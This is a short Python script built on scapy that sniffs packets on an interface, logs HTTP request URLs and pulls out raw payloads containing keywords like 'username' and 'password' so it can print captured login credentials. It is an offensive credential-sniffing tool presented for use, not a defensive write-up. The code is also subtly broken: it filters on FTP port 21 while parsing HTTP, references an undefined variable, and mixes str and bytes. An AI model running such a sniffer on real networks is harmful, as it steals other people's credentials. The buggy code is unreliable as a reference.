#!/usr/bin/env python

import scapy.all as scapy
# to filer http packets
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 21")
    # store = do not store the data, just print
    # iface = which interface to sniff
    # prn = specify a callback function, execture the process_sniffed_packet for each packet sniffed
    # filter = using Berkeley Packet Filter (BPF) syntax

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
# in the process_sniffed_packet we will manipulate the incoming packet

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet.show())
        load = packet[scapy.Raw].load
        keywords = ["username", "password", "login", "user", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + load + "\n\n")

            # the load field is sometimes useful for password and sometimes for other things too, so we will check if it contains the words password/username

sniff("eth0")